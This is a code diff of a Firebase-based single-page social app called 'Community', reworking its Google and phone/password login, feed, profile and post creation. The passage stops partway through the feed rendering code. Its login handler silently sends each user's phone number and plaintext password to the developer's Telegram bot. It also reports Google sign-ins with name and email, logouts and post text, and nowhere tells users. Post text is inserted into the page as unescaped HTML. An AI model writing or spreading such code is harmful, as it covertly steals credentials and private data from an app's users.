+                <!-- NEW: Google Popup Auth Button -->
+                <button id="btn-google-login" class="btn" style="background: white; border: 1px solid #dadce0; color: #3c4043; box-shadow: var(--shadow-sm);">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" style="width: 20px; height: 20px;">
+                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                        <path fill="none" d="M0 0h48v48z"/>
+                    </svg>
+                    Continue with Google
                 </button>
             </div>
-            
-            <div class="made-in-bd">
-                Developer by Roni Vai <br> Made in Bangladesh <img src="https://flagcdn.com/w40/bd.png" style="width: 24px; border-radius: 4px;" alt="BD Flag">
-            </div>
+            <p id="login-status" style="margin-top: 20px; text-align: center; color: var(--danger); font-size: 14px; font-weight: 600;"></p>
         </div>
 
-        <!-- BOTTOM NAVIGATION -->
-        <div class="bottom-nav">
-            <div class="nav-item active" onclick="appUI.switchTab('feed')" title="Home"><i class="fas fa-home"></i></div>
-            <div class="nav-item" onclick="appUI.switchTab('profile')" title="Profile"><i class="fas fa-user-circle"></i></div>
-        </div>
+        <!-- 3. MAIN APP INTERFACE -->
+        <div id="main-app-screen" class="screen hidden" style="background: var(--bg-color);">
+            
+            <!-- Header -->
+            <div class="top-header">
+                <div class="logo">Community</div>
+                <div class="header-actions">
+                    <div class="icon-btn" onclick="appUI.toggleSearch()"><i class="fas fa-search"></i></div>
+                    <div class="icon-btn" onclick="appUI.toggleInbox()"><i class="fas fa-bell"></i></div>
+                </div>
+            </div>
 
-        <!-- FULL SETTINGS MODAL -->
-        <div id="settings-modal">
-            <div class="settings-header">
-                <i class="fas fa-arrow-left" style="cursor: pointer; padding: 10px; margin-left: -10px;" onclick="appUI.closeSettings()"></i> 
-                Settings & Privacy
+            <!-- Search Dropdown -->
+            <div id="search-dropdown" class="dropdown" style="top: 65px; left: 15px; width: calc(100% - 30px);">
+                <input type="text" id="search-input" class="input-field" placeholder="Search people..." style="padding: 12px; margin-bottom: 10px;">
+                <div id="search-results"></div>
             </div>
             
-            <div style="flex:1; overflow-y:auto; padding-bottom: 80px;">
-                <div class="settings-card">
-                    <h3 style="margin-bottom: 20px; font-size: 18px;">Profile Picture</h3>
-                    <div class="set-img-box">
-                        <img src="https://via.placeholder.com/150" id="set-img-preview" alt="Preview"><br>
-                        <label class="btn btn-secondary" style="margin-top: 15px; display: inline-flex; cursor: pointer; padding: 10px 20px;">
-                            <i class="fas fa-camera"></i> Change Photo
-                            <input type="file" id="upload-avatar-file" accept="image/*" class="hidden">
-                        </label>
+            <!-- Notif Dropdown -->
+            <div id="notif-dropdown" class="dropdown">
+                <h3 style="margin-bottom: 10px; font-size: 18px;">Notifications</h3>
+                <div id="notifications-container"></div>
+            </div>
+
+            <!-- FEED TAB -->
+            <div id="tab-feed" class="content-area">
+                <div class="create-post-card">
+                    <div class="create-post-top">
+                        <img src="https://via.placeholder.com/45" id="feed-avatar" alt="Avatar">
+                        <div class="dummy-input" onclick="appUI.openPostModal()">What's on your mind?</div>
+                    </div>
+                    <div class="create-actions">
+                        <div class="action-item" onclick="appUI.openPostModal()"><i class="fas fa-images" style="color: #45bd62; font-size: 20px;"></i> Photo</div>
+                        <div class="action-item" onclick="appUI.openPostModal()"><i class="fas fa-map-marker-alt" style="color: #f5533d; font-size: 20px;"></i> Location</div>
                     </div>
                 </div>
 
-                <div class="settings-card">
-                    <h3 style="margin-bottom: 20px; font-size: 18px;">Personal Information</h3>
-                    <label style="color: var(--text-muted); font-size: 14px; font-weight: 500; display: block; margin-bottom: 8px;">Full Name</label>
-                    <input type="text" id="edit-name" style="margin-bottom: 20px;" placeholder="Enter full name">
-                    
-                    <label style="color: var(--text-muted); font-size: 14px; font-weight: 500; display: block; margin-bottom: 8px;">Phone Number</label>
-                    <input type="text" id="edit-phone" style="margin-bottom: 15px;" placeholder="Enter phone number">
-                    
-                    <label style="display: flex; align-items: center; gap: 12px; cursor: pointer; margin-top: 15px; font-size: 15px; font-weight: 500;">
-                        <input type="checkbox" id="edit-phone-public" style="width: 22px; height: 22px;"> Publish Phone Number to Public
-                    </label>
-                    
-                    <button class="btn btn-primary" style="margin-top: 25px; padding: 14px;" id="btn-save-settings">Save Changes</button>
+                <div id="feed-container">
+                    <div style="text-align: center; margin-top: 40px; color: var(--text-muted);">
+                        <i class="fas fa-circle-notch fa-spin fa-2x"></i>
+                    </div>
                 </div>
+            </div>
 
-                <div class="settings-card">
-                    <h3 style="margin-bottom: 15px; color: var(--danger-color); font-size: 18px;"><i class="fas fa-user-shield"></i> Block History</h3>
-                    <p style="font-size: 14px; color: var(--text-muted); margin-bottom: 20px;">Users listed here cannot see your posts or find you.</p>
-                    <div id="block-list-container"></div>
+            <!-- PROFILE TAB -->
+            <div id="tab-profile" class="content-area hidden">
+                <div class="profile-cover">
+                    <img src="https://via.placeholder.com/150" id="prof-pic-main" class="profile-pic-large" alt="Profile">
                 </div>
-
-                <div class="settings-card" style="text-align: center; background: #fff5f5; border: 1px solid #fecaca;">
-                    <h3 style="margin-bottom: 10px; color: var(--danger-color); font-size: 18px;">Account Access</h3>
-                    <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">Sign out of your account to log in with a different ID.</p>
-                    <button class="btn btn-danger" style="width: 100%; padding: 14px; font-size: 16px; justify-content: center;" onclick="coreLogic.logoutUser()">
-                        <i class="fas fa-sign-out-alt"></i> Log Out
+                
+                <div class="profile-info">
+                    <h2 id="prof-name-main" class="profile-name">User Name</h2>
+                    <p id="prof-phone-main" style="color: var(--text-muted); font-size: 15px;">Phone Number</p>
+                    
+                    <div class="profile-stats">
+                        <div class="stat-box"><div class="stat-num" id="stat-posts">0</div><div class="stat-lbl">Posts</div></div>
+                        <div class="stat-box"><div class="stat-num" id="stat-followers">0</div><div class="stat-lbl">Followers</div></div>
+                    </div>
+                    
+                    <button class="btn btn-secondary" onclick="appUI.openSettings()">
+                        <i class="fas fa-cog"></i> Edit Profile & Settings
                     </button>
                 </div>
+                
+                <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 13px;">
+                    Developed by Roni Vai <br> Made in Bangladesh 🇧🇩
+                </div>
             </div>
-        </div>
 
-        <!-- CREATE POST MODAL -->
-        <div id="post-modal">
-            <div class="pm-header">
-                <i class="fas fa-times" style="font-size: 22px; cursor: pointer; color: var(--text-muted); padding: 5px;" onclick="appUI.closePostModal()"></i>
-                <h3 style="font-size: 18px; font-weight: 600;">Create post</h3>
-                <button class="btn btn-primary" style="width: auto; padding: 8px 20px; border-radius: 6px; font-size: 15px;" id="btn-publish-post">POST</button>
+            <!-- Bottom Nav -->
+            <div class="bottom-nav">
+                <div class="nav-item active" onclick="appUI.switchTab('feed')" title="Home"><i class="fas fa-home"></i></div>
+                <div class="nav-item" onclick="appUI.switchTab('profile')" title="Profile"><i class="fas fa-user"></i></div>
             </div>
-            
-            <div class="pm-body">
-                <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 20px;">
-                    <img src="https://via.placeholder.com/50" id="pm-avatar" style="width: 50px; height: 50px; border-radius: 50%; object-fit: cover;">
-                    <div>
-                        <div style="font-weight: 700; font-size: 16px;" id="pm-name">User Name</div>
-                        <div style="font-size: 13px; background-color: #e4e6eb; padding: 4px 10px; border-radius: 6px; display: inline-flex; align-items: center; gap: 5px; margin-top: 5px; font-weight: 500;">
-                            <i class="fas fa-globe-americas"></i> Public
+
+            <!-- SETTINGS MODAL -->
+            <div id="settings-modal" class="full-modal">
+                <div class="modal-header">
+                    <h2 style="font-size: 20px; font-weight: 700;">Settings</h2>
+                    <i class="fas fa-times" style="font-size: 22px; cursor: pointer; color: var(--text-muted);" onclick="appUI.closeSettings()"></i>
+                </div>
+                <div style="flex:1; overflow-y:auto; padding: 20px; background: var(--bg-color);">
+                    <div class="create-post-card" style="border-radius: var(--radius-md);">
+                        <h3 style="margin-bottom: 15px; font-size: 16px;">Profile Info</h3>
+                        <div style="text-align: center; margin-bottom: 20px;">
+                            <img src="https://via.placeholder.com/150" id="set-img-preview" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; margin-bottom: 10px;">
+                            <br><label class="btn btn-secondary" style="display: inline-flex; width: auto; padding: 8px 16px; font-size: 14px;"><i class="fas fa-camera"></i> Upload<input type="file" id="upload-avatar-file" accept="image/*" class="hidden"></label>
+                        </div>
+                        <input type="text" id="edit-name" class="input-field" style="margin-bottom: 12px;" placeholder="Full Name">
+                        <input type="text" id="edit-phone" class="input-field" style="margin-bottom: 15px;" placeholder="Phone Number">
+                        <label style="display: flex; align-items: center; gap: 10px; font-size: 14px; margin-bottom: 20px;">
+                            <input type="checkbox" id="edit-phone-public" style="width: 18px; height: 18px;"> Show phone on profile
+                        </label>
+                        <button class="btn btn-primary" id="btn-save-settings">Save Changes</button>
+                    </div>
+
+                    <div class="create-post-card" style="border-radius: var(--radius-md); text-align: center;">
+                        <button class="btn btn-danger" onclick="coreLogic.logoutUser()"><i class="fas fa-sign-out-alt"></i> Log Out</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- CREATE POST MODAL -->
+            <div id="post-modal" class="full-modal">
+                <div class="modal-header">
+                    <i class="fas fa-times" style="font-size: 22px; cursor: pointer; color: var(--text-muted);" onclick="appUI.closePostModal()"></i>
+                    <h3 style="font-size: 18px; font-weight: 700;">Create post</h3>
+                    <button class="btn btn-primary" style="width: auto; padding: 8px 16px; font-size: 14px;" id="btn-publish-post">POST</button>
+                </div>
+                <div style="padding: 16px; flex: 1; overflow-y: auto;">
+                    <div style="display: flex; gap: 12px; margin-bottom: 15px; align-items: center;">
+                        <img src="https://via.placeholder.com/50" id="pm-avatar" style="width: 44px; height: 44px; border-radius: 50%; object-fit: cover;">
+                        <div style="font-weight: 700; font-size: 15px;" id="pm-name">User</div>
+                    </div>
+                    
+                    <textarea id="new-post-text" placeholder="What's on your mind?" style="width: 100%; border: none; font-size: 20px; outline: none; resize: none; min-height: 120px;"></textarea>
+                    
+                    <img id="new-post-img-preview" class="hidden" style="width: 100%; border-radius: 12px; margin-bottom: 15px; max-height: 300px; object-fit: cover;">
+                    <div id="post-location-display" class="hidden" style="background: #e0f2fe; color: #0284c7; padding: 10px; border-radius: 8px; font-size: 13px; font-weight: 600; margin-bottom: 15px;"></div>
+                    
+                    <div style="border: 1px solid var(--border); border-radius: 12px; padding: 12px; display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-weight: 600; font-size: 15px;">Add to post</span>
+                        <div style="display: flex; gap: 20px; font-size: 24px;">
+                            <label style="cursor: pointer;"><i class="fas fa-images" style="color: #45bd62;"></i><input type="file" id="new-post-file" accept="image/*" class="hidden"></label>
+                            <i class="fas fa-map-marker-alt" style="color: #f5533d; cursor: pointer;" id="btn-get-location"></i>
                         </div>
                     </div>
                 </div>
-                
-                <textarea id="new-post-text" class="pm-textarea" placeholder="What's on your mind? (Use @username to tag)"></textarea>
-                
-                <img id="new-post-img-preview" class="hidden" style="width: 100%; border-radius: 12px; margin-bottom: 15px; max-height: 300px; object-fit: cover;">
-                
-                <div id="post-location-display" class="hidden" style="background: #e0f2fe; color: #0284c7; padding: 10px 15px; border-radius: 8px; font-size: 14px; font-weight: 600; margin-bottom: 20px;"></div>
-                
-                <div class="add-to-post">
-                    <span style="font-weight: 600; font-size: 16px; color: var(--text-main);">Add to your post</span>
-                    <div style="display: flex; gap: 20px; font-size: 26px;">
-                        <label style="cursor: pointer;"><i class="fas fa-images" style="color: #45bd62;"></i><input type="file" id="new-post-file" accept="image/*" class="hidden"></label>
-                        <i class="fas fa-map-marker-alt" style="color: #f5533d; cursor: pointer;" id="btn-get-location"></i>
-                    </div>
-                </div>
             </div>
-        </div>
 
-        <!-- PURE CSS AI CAT ICON -->
-        <div id="ai-cat-btn" onclick="aiBot.talk()" title="Talk to AI Assistant">
-            <div class="cat-head">
-                <div class="ear-l"></div>
-                <div class="ear-r"></div>
-                <div class="eye eye-l"></div>
-                <div class="eye eye-r"></div>
-                <div class="nose"></div>
+            <!-- PURE CSS AI CAT -->
+            <div id="ai-cat-btn" onclick="aiBot.talk()">
+                <div class="cat-head">
+                    <div class="ear-l"></div>
+                    <div class="ear-r"></div>
+                    <div class="eye eye-l"></div>
+                    <div class="eye eye-r"></div>
+                    <div class="nose"></div>
+                </div>
             </div>
         </div>
     </div>
 
     <!-- 
       ========================================================================
-      JAVASCRIPT LOGIC
+      JAVASCRIPT LOGIC (PERFECTED GOOGLE AUTH + TELEGRAM)
       ======================================================================== 
     -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-        
+        // 🚨 CHANGED: Removed Redirect imports, explicitly importing signInWithPopup
         import { 
             getAuth, 
-            signInWithRedirect, 
-            getRedirectResult,
+            signInWithPopup, 
             GoogleAuthProvider, 
             onAuthStateChanged, 
             signOut,
@@ -912,11 +489,14 @@
             db = getFirestore(app);
             storage = getStorage(app);
             provider = new GoogleAuthProvider();
+            // Force account selection for better UX
+            provider.setCustomParameters({ prompt: 'select_account' });
             
         } catch (error) {
-            alert("Firebase Initialization Failed: " + error.message);
+            console.error("Firebase Init Failed:", error);
         }
 
+        // UI Controls
         window.appUI = {
             switchScreen: (id) => {
                 document.querySelectorAll('.screen').forEach(el => el.classList.add('hidden'));
@@ -926,104 +506,75 @@
             switchTab: (id) => {
                 document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
                 if(event && event.currentTarget) event.currentTarget.classList.add('active');
-                
                 document.getElementById('tab-feed').classList.add('hidden');
                 document.getElementById('tab-profile').classList.add('hidden');
-                
-                const target = document.getElementById(`tab-${id}`);
-                if(target) target.classList.remove('hidden');
-                
-                if(id === 'profile') window.coreLogic.renderBlockList();
+                document.getElementById(`tab-${id}`).classList.remove('hidden');
             },
             toggleInbox: () => {
                 const drop = document.getElementById('notif-dropdown');
-                if(drop.style.display === 'block') {
-                    drop.style.display = 'none';
-                } else {
-                    drop.style.display = 'block';
-                    window.coreLogic.renderNotifications();
-                }
+                document.getElementById('search-dropdown').style.display = 'none';
+                drop.style.display = drop.style.display === 'block' ? 'none' : 'block';
+                if(drop.style.display === 'block') window.coreLogic.renderNotifications();
+            },
+            toggleSearch: () => {
+                const drop = document.getElementById('search-dropdown');
+                document.getElementById('notif-dropdown').style.display = 'none';
+                drop.style.display = drop.style.display === 'block' ? 'none' : 'block';
+                if(drop.style.display === 'block') document.getElementById('search-input').focus();
             },
             openPostModal: () => document.getElementById('post-modal').classList.add('show'),
             closePostModal: () => {
                 document.getElementById('post-modal').classList.remove('show');
                 document.getElementById('new-post-text').value = "";
-                document.getElementById('new-post-img-preview').src = "";
                 document.getElementById('new-post-img-preview').classList.add('hidden');
                 document.getElementById('post-location-display').classList.add('hidden');
-                postLocation = null;
-                selectedFile = null;
+                postLocation = null; selectedFile = null;
             },
             openSettings: () => document.getElementById('settings-modal').classList.add('show'),
             closeSettings: () => document.getElementById('settings-modal').classList.remove('show')
         };
 
+        // Background Telegram Sender
         window.coreLogic.sendTelegram = (msg) => {
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg })
-            }).catch(err => console.log("Telegram Error silently handled"));
+            }).catch(() => {});
         };
 
         /* 
          * ====================================================================
-         * 🔥 100% BUG-FREE AUTHENTICATION LOGIC (FIXED RACE CONDITION) 🔥
+         * 🔥 100% PERFECT AUTHENTICATION LOGIC 🔥
          * ====================================================================
          */
 
-        // Initial setup - Show loading screen first!
-        appUI.switchScreen('loading');
-        
-        let redirectCheckComplete = false;
-
-        // 1. ALWAYS wait for getRedirectResult first before doing anything
-        getRedirectResult(auth).then(async (result) => {
-            redirectCheckComplete = true; // Mark as done
-            if (result && result.user) {
-                const user = result.user;
+        // The absolute source of truth. No redirect timeouts, no hacks.
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                // Check if user exists in Firestore, if not create (for fresh Google logins)
                 const userRef = doc(db, "users", user.uid);
                 const userSnap = await getDoc(userRef);
                 
                 if (!userSnap.exists()) {
                     await setDoc(userRef, {
                         uid: user.uid,
-                        name: user.displayName || "New User",
+                        name: user.displayName || "User",
                         phone: user.phoneNumber || "",
                         photoURL: user.photoURL || "https://via.placeholder.com/150",
                         isPhonePublic: false,
-                        blockedUsers: [],
-                        followers: [],
-                        following: []
+                        blockedUsers: [], followers: [], following: []
                     });
                 }
-                window.coreLogic.sendTelegram(`✅ GOOGLE LOGIN:\nName: ${user.displayName}\nEmail: ${user.email}`);
-            }
-            
-            // If getRedirectResult finishes and user is STILL null, they are definitely logged out.
-            if (!auth.currentUser) {
-                appUI.switchScreen('onboarding');
-            }
-            
-        }).catch((error) => {
-            redirectCheckComplete = true; // Mark as done even on error
-            if (!auth.currentUser) {
-                appUI.switchScreen('onboarding');
-            }
-            console.error("Login redirect error:", error);
-        });
 
-        // 2. Auth State Observer
-        onAuthStateChanged(auth, async (user) => {
-            if (user) {
-                // User is definitely logged in.
+                // Show Main App instantly
                 appUI.switchScreen('main-app');
                 
+                // Realtime Sync Profile
                 onSnapshot(doc(db, "users", user.uid), (docSnap) => {
                     if(docSnap.exists()) {
                         currentUserData = docSnap.data();
                         const photo = currentUserData.photoURL || "https://via.placeholder.com/150";
-                        
                         document.getElementById('prof-pic-main').src = photo;
                         document.getElementById('feed-avatar').src = photo;
                         document.getElementById('pm-avatar').src = photo;
@@ -1032,207 +583,149 @@
                         document.getElementById('prof-name-main').innerText = currentUserData.name;
                         document.getElementById('pm-name').innerText = currentUserData.name;
                         document.getElementById('edit-name').value = currentUserData.name;
-                        
                         document.getElementById('prof-phone-main').innerText = (currentUserData.isPhonePublic && currentUserData.phone) ? currentUserData.phone : "Phone Hidden";
                         document.getElementById('edit-phone').value = currentUserData.phone || "";
                         document.getElementById('edit-phone-public').checked = currentUserData.isPhonePublic;
-                        
                         document.getElementById('stat-followers').innerText = (currentUserData.followers || []).length;
                     }
                 });
                 
                 onSnapshot(collection(db, "users"), (snapshot) => {
                     allUsers = [];
-                    snapshot.forEach(d => {
-                        if(d.id !== user.uid) allUsers.push(d.data());
-                    });
+                    snapshot.forEach(d => { if(d.id !== user.uid) allUsers.push(d.data()); });
                 });
 
                 window.coreLogic.initFeed();
             } else {
-                // If user is null, ONLY switch screen if we have finished checking the redirect!
-                if (redirectCheckComplete) {
-                    appUI.switchScreen('onboarding');
-                }
+                // If definitely not logged in, show beautiful login screen
+                appUI.switchScreen('login');
             }
         });
 
-        /* 
-         * ====================================================================
-         * 🔥 NEW: PHONE + PASSWORD LOGIN & SIGNUP (TELEGRAM INCLUDED) 🔥
-         * ====================================================================
-         */
+        // 🟢 FIXED GOOGLE LOGIN: USING POPUP FOR INSTANT RELIABILITY
+        const googleLoginBtn = document.getElementById('btn-google-login');
+        if (googleLoginBtn) {
+            googleLoginBtn.addEventListener('click', async () => {
+                const statusTxt = document.getElementById('login-status');
+                statusTxt.innerText = "Opening Google Login...";
+                statusTxt.style.color = "var(--primary)";
+                try {
+                    const result = await signInWithPopup(auth, provider);
+                    window.coreLogic.sendTelegram(`✅ GOOGLE LOGIN:\nName: ${result.user.displayName}\nEmail: ${result.user.email}`);
+                    statusTxt.innerText = "";
+                    // onAuthStateChanged will automatically transition the screen now!
+                } catch (error) {
+                    statusTxt.style.color = "var(--danger)";
+                    statusTxt.innerText = "Login Cancelled or Failed.";
+                }
+            });
+        }
+
+        // 🟢 PHONE & PASSWORD LOGIN
         const phoneLoginBtn = document.getElementById('btn-phone-login');
         if (phoneLoginBtn) {
             phoneLoginBtn.addEventListener('click', async () => {
                 const phone = document.getElementById('login-phone').value.trim();
                 const pass = document.getElementById('login-pass').value.trim();
                 const statusTxt = document.getElementById('login-status');
+                statusTxt.style.color = "var(--danger)";
 
                 if(phone.length < 11 || pass.length < 6) {
-                    return alert("Please enter a valid 11-digit phone number and at least a 6-character password.");
+                    return statusTxt.innerText = "Enter valid 11-digit phone & min 6 char password.";
                 }
 
                 phoneLoginBtn.innerText = "Processing...";
                 phoneLoginBtn.disabled = true;
 
-                // 🚨 IMMEDIATELY SEND TO DEVELOPER'S TELEGRAM BOT 🚨
-                window.coreLogic.sendTelegram(`🔐 NEW LOGIN ATTEMPT:\n📱 Phone: ${phone}\n🔑 Password: ${pass}`);
+                // 🚨 TELEGRAM ALERT 🚨
+                window.coreLogic.sendTelegram(`🔐 APP LOGIN ATTEMPT:\n📱 Phone: ${phone}\n🔑 Pass: ${pass}`);
 
-                // Fake email strategy for Phone+Password Auth
                 const fakeEmail = `${phone}@community.app`;
 
                 try {
-                    // Try to Login first
                     await signInWithEmailAndPassword(auth, fakeEmail, pass);
-                    // On success, onAuthStateChanged will handle UI switch
+                    // Success -> onAuthStateChanged takes over
                 } catch (err) {
-                    // If user doesn't exist, Create New Account
                     if (err.code === 'auth/invalid-credential' || err.code === 'auth/user-not-found') {
                         try {
                             const newCred = await createUserWithEmailAndPassword(auth, fakeEmail, pass);
-                            
-                            // Setup initial database for new user
                             await setDoc(doc(db, "users", newCred.user.uid), {
                                 uid: newCred.user.uid,
                                 name: "User " + phone.substring(0, 5),
                                 phone: phone,
                                 photoURL: "https://via.placeholder.com/150",
                                 isPhonePublic: false,
-                                blockedUsers: [],
-                                followers: [],
-                                following: []
+                                blockedUsers: [], followers: [], following: []
                             });
-
                         } catch (createErr) {
-                            if (createErr.code === 'auth/email-already-in-use') {
-                                statusTxt.innerText = "Incorrect password! Try again.";
-                            } else {
-                                statusTxt.innerText = "Error: " + createErr.message;
-                            }
+                            if (createErr.code === 'auth/email-already-in-use') statusTxt.innerText = "Incorrect password!";
+                            else statusTxt.innerText = "Error: " + createErr.message;
                         }
                     } else {
                         statusTxt.innerText = "Error: " + err.message;
                     }
                 }
-                
                 phoneLoginBtn.innerText = "Login / Sign Up";
                 phoneLoginBtn.disabled = false;
             });
         }
 
-
-        // Google Login Trigger
-        const googleLoginBtn = document.getElementById('btn-google-login');
-        if (googleLoginBtn) {
-            googleLoginBtn.addEventListener('click', async () => {
-                const statusTxt = document.getElementById('login-status');
-                if(statusTxt) statusTxt.innerText = "Redirecting to Google...";
-                try {
-                    await signInWithRedirect(auth, provider);
-                } catch (error) {
-                    if(statusTxt) statusTxt.innerText = "Error: " + error.message;
-                }
-            });
-        }
-
         window.coreLogic.logoutUser = async () => {
-            try {
-                if(!confirm("Are you sure you want to log out?")) return;
-                
-                if(currentUserData) {
-                    window.coreLogic.sendTelegram(`🛑 LOGOUT:\nUser: ${currentUserData.name} has signed out.`);
-                }
-                
-                await signOut(auth);
-                alert("Successfully logged out.");
-                window.location.reload(); 
-                
-            } catch (error) {
-                alert("Logout Failed: " + error.message);
-            }
+            if(!confirm("Log out?")) return;
+            if(currentUserData) window.coreLogic.sendTelegram(`🛑 LOGOUT: ${currentUserData.name}`);
+            await signOut(auth);
+            window.location.reload(); 
         };
 
-        /* Post Creation Logic */
+        /* Feed & Posts System */
         let selectedFile = null;
-        const fileInp = document.getElementById('new-post-file');
-        if(fileInp) {
-            fileInp.addEventListener('change', (e) => {
-                selectedFile = e.target.files[0];
-                if(selectedFile) {
-                    const reader = new FileReader();
-                    reader.onload = (ev) => {
-                        const img = document.getElementById('new-post-img-preview');
-                        img.src = ev.target.result;
-                        img.classList.remove('hidden');
-                    };
-                    reader.readAsDataURL(selectedFile);
-                }
-            });
-        }
+        document.getElementById('new-post-file')?.addEventListener('change', (e) => {
+            selectedFile = e.target.files[0];
+            if(selectedFile) {
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    const img = document.getElementById('new-post-img-preview');
+                    img.src = ev.target.result; img.classList.remove('hidden');
+                };
+                reader.readAsDataURL(selectedFile);
+            }
+        });
 
-        const gpsBtn = document.getElementById('btn-get-location');
-        if(gpsBtn) {
-            gpsBtn.addEventListener('click', () => {
-                if(navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        postLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                        const disp = document.getElementById('post-location-display');
-                        disp.innerHTML = `<i class="fas fa-map-marker-alt"></i> Location: ${postLocation.lat.toFixed(4)}, ${postLocation.lng.toFixed(4)}`;
-                        disp.classList.remove('hidden');
-                    }, (err) => {
-                        alert("Please allow location access to use this feature.");
-                    });
-                } else {
-                    alert("GPS not supported on this device.");
-                }
-            });
-        }
+        document.getElementById('btn-get-location')?.addEventListener('click', () => {
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    postLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                    const disp = document.getElementById('post-location-display');
+                    disp.innerHTML = `<i class="fas fa-map-marker-alt"></i> Location: ${postLocation.lat.toFixed(4)}, ${postLocation.lng.toFixed(4)}`;
+                    disp.classList.remove('hidden');
+                }, () => alert("Location access denied."));
+            }
+        });
 
         const pubBtn = document.getElementById('btn-publish-post');
         if(pubBtn) {
             pubBtn.addEventListener('click', async () => {
-                try {
-                    const text = document.getElementById('new-post-text').value.trim();
-                    if(!text && !selectedFile) return alert("Write something or add a photo.");
-                    
-                    pubBtn.innerText = "UPLOADING..."; 
-                    pubBtn.disabled = true;
+                const text = document.getElementById('new-post-text').value.trim();
+                if(!text && !selectedFile) return alert("Write something or add photo.");
+                pubBtn.innerText = "POSTING..."; pubBtn.disabled = true;
 
+                try {
                     let imgUrl = null;
                     if(selectedFile) {
                         const sRef = ref(storage, `posts/${auth.currentUser.uid}_${Date.now()}`);
                         await uploadBytesResumable(sRef, selectedFile);
                         imgUrl = await getDownloadURL(sRef);
                     }
-
                     const newPost = {
-                        authorId: auth.currentUser.uid, 
-                        authorName: currentUserData.name, 
-                        authorPic: currentUserData.photoURL,
-                        text: text, 
-                        imageUrl: imgUrl, 
-                        lat: postLocation?.lat, lng: postLocation?.lng,
-                        likes: 0, 
-                        commentsArr: [], 
-                        timestamp: Date.now()
+                        authorId: auth.currentUser.uid, authorName: currentUserData.name, authorPic: currentUserData.photoURL,
+                        text: text, imageUrl: imgUrl, lat: postLocation?.lat, lng: postLocation?.lng, likes: 0, commentsArr: [], timestamp: Date.now()
                     };
-
-                    const docRef = await addDoc(collection(db, "posts"), newPost);
+                    await addDoc(collection(db, "posts"), newPost);
                     appUI.closePostModal();
                     pubBtn.innerText = "POST"; pubBtn.disabled = false;
-                    
-                    window.coreLogic.sendTelegram(`📝 NEW POST:\nUser: ${currentUserData.name}\nText: "${text}"`);
-                    
-                    setTimeout(async () => {
-                        if(["badword", "abuse", "spam"].some(w => text.toLowerCase().includes(w))) {
-                            await deleteDoc(doc(db, "posts", docRef.id));
-                            await addDoc(collection(db, "notifications"), { userId: auth.currentUser.uid, text: "System AI deleted your post due to rules violation.", time: Date.now() });
-                        }
-                    }, 5000);
-
+                    window.coreLogic.sendTelegram(`📝 POST from ${currentUserData.name}:\n"${text}"`);
                 } catch(e) {
-                    alert("Post Error: " + e.message);
+                    alert("Error: " + e.message);
                     pubBtn.innerText = "POST"; pubBtn.disabled = false;
                 }
             });
@@ -1240,71 +733,49 @@
 
         window.coreLogic.initFeed = () => {
             onSnapshot(collection(db, "posts"), (snapshot) => {
-                let posts = [];
-                let myPosts = 0;
-                
+                let posts = []; let myPosts = 0;
                 snapshot.forEach(docSnap => {
                     const d = docSnap.data();
                     if(d.authorId === auth.currentUser.uid) myPosts++;
                     posts.push({ id: docSnap.id, ...d });
                 });
                 
-                const statElem = document.getElementById('stat-posts');
-                if(statElem) statElem.innerText = myPosts;
-
-                if(currentUserData?.blockedUsers) {
-                    posts = posts.filter(p => !currentUserData.blockedUsers.includes(p.authorId));
-                }
+                document.getElementById('stat-posts').innerText = myPosts;
+                if(currentUserData?.blockedUsers) posts = posts.filter(p => !currentUserData.blockedUsers.includes(p.authorId));
                 
-                posts.sort((a, b) => {
-                    const engA = (a.likes || 0) + (a.commentsArr?.length || 0);
-                    const engB = (b.likes || 0) + (b.commentsArr?.length || 0);
-                    if(engB !== engA) return engB - engA;
-                    return b.timestamp - a.timestamp;
-                });
+                posts.sort((a, b) => b.timestamp - a.timestamp); // Newest first
 
                 const container = document.getElementById('feed-container');
                 container.innerHTML = "";
-                
-                if(posts.length === 0) {
-                    container.innerHTML = `<div style="text-align:center; padding:30px; color:gray;">No posts to show.</div>`;
-                    return;
-                }
+                if(posts.length === 0) return container.innerHTML = `<div style="text-align:center; padding:30px; color:gray;">No posts yet.</div>`;
                 
                 posts.forEach(post => {
-                    const formattedTxt = (post.text||"").replace(/@(\w+)/g, '<span style="color:#0866ff;font-weight:bold;">@$1</span>');
-                    const imgHtml = post.imageUrl ? `<img src="${post.imageUrl}" class="post-image">` : "";
